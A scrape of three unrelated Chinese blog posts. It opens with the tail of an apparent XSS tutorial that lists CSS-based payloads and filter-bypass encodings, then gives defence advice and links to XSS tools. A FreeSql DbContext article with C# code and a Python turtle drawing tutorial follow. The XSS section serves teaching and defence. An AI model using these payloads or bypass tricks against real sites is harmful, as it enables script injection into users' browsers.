<div style="background-image:url(javascript:alert('xss'))">
<style>
    body {background-image:url("javascript:alert('xss')");}
</style>
       css中使用expression执行javascript:
<div style="width: expression(alert('xss'))">
<img src="#" style="xss:expression(alert(/xss/))">
<style>
    body {background-image:expression("alert('xss')");}
</style>
       在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。
       除了上述两种，还可以利用@import直接执行javascript代码
<style>
    @import 'javascript:alert("xss")';
</style>
       在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。
扰乱规则

大小写变换;
利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;
结合样式表注释字符/**/，通过css执行javascript
样式标签会过滤\和\0，可以构造如@i\mp\0\0ort 'jav\0asc\0rip\t:al\0er\t("x\0ss")'绕过
Css关键字进行编码处理，如<p style="xss:\0065xpression(alert(/xss/))">其中65为字母e进行unicode编码后的数字部分
利用浏览器解析注释的问题

利用字符编码
       javascript支持许多的编码格式，如：

unicode
escapes
十六|十|八进制

如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力
在IE下甚至支持JScript Encode加密后的代码
拆分法
       如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：《疯狂的跨站之行》剑心(非原链接)
7) XSS防御
       说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？
输入
       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。
输出
       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。
其他
       设置HttpOnly，开启WAF。
写在最后
       感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客。
参考资料

书籍：
《Web前端黑客技术揭秘》
《XSS跨站脚本攻击剖析与防御》
《白帽子讲Web安全》
《黑客攻防技术宝典Web实战篇》第二版
文章：
XSS小结
浅说 XSS 和 CSRF
Session攻击手段(会话劫持/固定)及其安全防御措施
附录
https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华
https://github.com/rajeshmajumdar/BruteXSS BruteXSS
https://github.com/beefproject/beef Beef神器
https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本
https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POST
https://github.com/chuhades/xss_scan 反射xss扫描器
https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞
https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表
https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数
https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码

https://www.cnblogs.com/yunen/p/10581320.html
**************************************************
跟踪测试 DbContext ，向＂不是真正的 ORM＂ 说拜拜
FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。
方法一：基于 helper 的方式，祼用；

dotnet add package FreeSql

提供 CodeFirst、DbFirst、丰富的表达式树、读写分离、AOP等功能支持；
方法二：基于 Repository + UnitOfWok 的方式；

dotnet add package FreeSql.Repository

这是一个扩展包，提供标准的 IRepository 接口定义与默认实现，以及 UnitOfWork 工作单元的支持，更可怕的是集成了局部/全局过滤器，实现租户、软删除等功能不在话下。
不相信吗？请看以下代码：
public IServiceProvider ConfigureServices(IServiceCollection services) {
    services.AddSingleton<IFreeSql>(fsql);
    services.AddMvc();

    var builder = new ContainerBuilder();

    builder.RegisterFreeRepository(filter => filter
        .Apply<ISoftDelete>("SoftDelete", a => a.IsDeleted == false)
        .Apply<ITenant>("Tenant", a => a.TenantId == 1)
    );

    builder.Populate(services);
    var container = builder.Build();
    return new AutofacServiceProvider(container);
}
比 abpvnext 还要方便，因为 abp 的相关实体需要实现接口 ISoftDelete、ITenant；
我们没有这个限制，只要过滤器的表达式解析成功，就算可用；
使用在任何实体上的时候，只要 [实体].IsDeleted == false 能解析能过，就算可用；
方式三：基于 DbContext
这个项目仍然是一个扩展包，提类似 EFCore 那样的开发习惯。目前定义的规则如下：

文字规则略显复杂，后边有代码演示，以及图文介绍在 sqlite 和 sqlserver 下的测试过程。

DbContext

提供 SaveChanges 方法；
执行队列；

DbSet

提供 Add、AddRange、Remove、RemoveRange、Update、UpdateRange 方法；
以及 Select 属性（连去原有的 FreeSql 查询对象）；
私有对象 states，存储实体的副本哈希集合，key=实体的主键值，value=实体；

Add/AddRange(entitys)

验证 entitys 主键值，是否存在于 states 中，存在时报错；
验证 entitys 主键中存在自增：

若有，则立即开启 DbContext 事务，按数据库种类执行相应的方法，最终将返回的自增值，赋给entitys的属性；
若无，并且 entitys 无主键值，则报错；
否则，进入【打包执行队列】；

完成时更新 states；

Remove/RemoveRange(entitys)

验证 entitys 主键值，若无则报错；
验证 states 中是否存在，若无则提醒应该先查询，再删除；
删除 states 对应的实体；
清除 entitys 内的自增属性值、Guid 类型的值，那这个 entitys 将变为可 Add 状态；
进入【打包执行队列】；

Update/UpdateRange(entitys)

验证 entitys 主键值，若无则报错；
验证 states 中是否存在，若无则提醒应该先查询，再删除；
进入【打包执行队列】；

Select

立即执行队列中的命令（打包方式），以免脏读到未提交的数据；
查询完成时，更新 states 的值；

更新数据规则

对比 states 中存在的历史快照值，返回即将修改的 fields；

演示代码
using FreeSql;

public class SongContext : DbContext {

    public DbSet<Song> Songs { get; set; }
    public DbSet<Tag> Tags { get; set; }

    protected override void OnConfiguring(DbContextOptionsBuilder builder) {
        builder.UseFreeSql(这里是IFreeeSql对象);
    }
}

public class Song {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public DateTime? Create_time { get; set; }
    public bool? Is_deleted { get; set; }
    public string Title { get; set; }
    public string Url { get; set; }
}
public class Tag {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public string Name { get; set; }
}

using (var ctx = new SongContext()) {

    ctx.Songs.Select.Where(a => a.Id > 10).ToList();
    //查询结果，存入 states

    var song = new Song { };
    //可插入的 song

    ctx.Songs.Add(song);
    id = song.Id;
    //因有自增类型，立即开启事务执行SQL，返回自增值

    var adds = Enumerable.Range(0, 100)
        .Select(a => new Song { Create_time = DateTime.Now, Is_deleted = false, Title = "xxxx" + a, Url = "url222" })
        .ToList();
    //创建一堆无主键值的数据

    ctx.Songs.AddRange(adds);
    //立即执行，将自增值赋给 adds 所有元素，因为有自增类型，如果其他类型，指定传入主键值，不会立即执行

    for (var a = 0; a < adds.Count; a++)
        adds[a].Title = "dkdkdkdk" + a;

    ctx.Songs.UpdateRange(adds);
    //批量修改，进入队列

    ctx.Songs.RemoveRange(adds.Skip(10).Take(20).ToList());
    //批量删除，进入队列，完成时 10-20 元素的主键值会被清除

    //ctx.Songs.Update(adds.First());

    adds.Last().Url = "skldfjlksdjglkjjcccc";
    ctx.Songs.Update(adds.Last());
    //单条修改 urls 的值，进入队列

    //throw new Exception("回滚");

    //ctx.Songs.Select.First();
    //这里做一个查询，会立即打包【执行队列】，避免没有提交的数据，影响查询结果

    ctx.SaveChanges();
    //打包【执行队列】，提交事务
}
在 sqlite 测试



打个岔：为什么一条条的执行？

有自增属性需要获取值；
sqlite 没有批量插入获取多个自增的办法，或者您有招来支一支(万分感谢)；
后面采用 sqlserver 测试，就不是这个境况了，insert into values(),(),()，然后利用 output 特性返回所有值；

比较蛋疼的是，这个特性不是所有数据库都有




可以看见，最终 SaveChanges 时将不会产生影响的命令，一起打包执行，即采用优化合并的方式进行执行。
例如：
ctx.Songs.Update(adds[0]);
ctx.Songs.Update(adds[1]);
这两个更新操作，会合成一条 SQL 命令执行。
在 sqlserver 测试
其实大致与 sqlite 下相同，唯一的区别在于 AddRange 的处理方式，如图：

当插入单条时，采用了第一行代码的 SQL 命令；
当批量插入时，采用了后面看上去复杂的 SQL 命令；
所有传入的实体属性值在执行完成后，都会更新；
特别说明
FreeSql.DbContext 目前仍处于研究开发阶段，不适合商用；
总结
为什么写这篇文章，时常看见有人说某某 orm 不是真正的 orm，没有 OO 思想。
希望 FreeSql.DbContext 随着时间的积累，稳定性和成熟度有所提升，不久成为一个真正的 ORM。
有人会担心，我们第三方做的不靠谱，没有 EFCore 稳定的说话，这个是当然。
但是我们也有自己的特点，不是吗？我们可以做到多种数据库使用习惯的一致性，这点 EFCore 目前是没有办法解决的难题。
从细节出发，我们的口号是：做 .NETCore 最方便的 ORM！
github: https://github.com/2881099/FreeSql 377星
还请献上宝贵的一星，谢谢观看！！

https://www.cnblogs.com/kellynic/p/10580936.html
**************************************************
Python入门必学，用Python练习画个美队盾牌

0 环境
Python版本：3.6.6
操作系统：Mac OS Mojave 10.14.2
1 引言
最近我媳妇每天晚上吃饭时候也拿手机看，上厕所也在看。
看着看着还会笑？WTF？你在干嘛呢？
没错，她在看美队……
这男人比我帅？……
比我有钱？……
还是比我有腔调？……
答案很明显，我相信你们的眼睛都是雪亮的。
那问题来了，作为一个男人，怎么能忍？虽然是个明星，虽然是假的，虽然已经挽回不了败局了……那我就送个美队的盾牌给你吧……
这篇文章不是Turtle的入门篇，所以关于基本的画笔使用小胖不在这篇里赘述了。有兴趣的可以留言，我会根据你们的反馈来写一篇或者一个系列。
2 实战
先来看一个效果图：

用过Turtle的都知道，画笔是需要抬手和落笔的。这一点一定要理解，因为计算机是很死板的，你的每一个动作都必须告诉他，包括GC。
所以你的画笔一旦落下，经过的每一处都会留下字迹。如果希望隔开一段距离就需要经过「抬笔」->「移动画笔」->「落笔」。
所以我们先把这个动作封装成一个函数：
def setpen(x, y):
    # 抬笔
    t.penup()
    # 移动画笔到(x, y)
    t.goto(x, y)
    # 落笔
    t.pendown()
    t.setheading(0)
接下来就来画盾牌。盾牌的话，注意观察美队盾牌，颜色是「红」->「白」->「红」->「蓝」。
这里有一个技巧，就是后面填充的圆圈背景色是可以覆盖之前画的圆圈的背景色。
def circle(x, y, r, color):
    # 为了保证画出的圆够圆，所以我们把圆的边设置的多一些
    n = 36
    angle = 360 / n
    pi = 3.1415926
    # 周长
    c = 2 * pi * r
    # 每条边的长度
    l = c / n
    # 起始位置
    start_x = x - l / 2
    start_y = y + r
    # 移动画笔
    setpen(start_x, start_y)
    # 选择画笔颜色
    t.pencolor(color)
    # 选择背景色
    t.fillcolor(color)
    # 填充
    t.begin_fill()
    for i in range(n):
        t.forward(l)
        t.right(angle)
    t.end_fill()
接下来就是画里面那个白色的五角星了，这里就不注释了，因为和画圈的过程差不多。
def five_star(l):
    setpen(0, 0)
    t.setheading(162)
    t.forward(150)
    t.setheading(0)
    t.fillcolor('WhiteSmoke')
    t.begin_fill()
    t.hideturtle()
    t.penup()
    for i in range(5):
        t.forward(l)
        t.right(144)
    t.end_fill()
主函数：
def sheild():
    circle(0, 0, 300, 'red')
    circle(0, 0, 250, 'white')
    circle(0, 0, 200, 'red')
    circle(0, 0, 150, 'blue')
    five_star(284)

if __name__ == '__main__':
    sheild()
    # 结束乌龟图
    turtle.done()
3 总结
这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。
关注公众号「Python专栏」，回复：美队盾牌，获取全套代码！


https://www.cnblogs.com/moonhmily/p/10580824.html
**************************************************
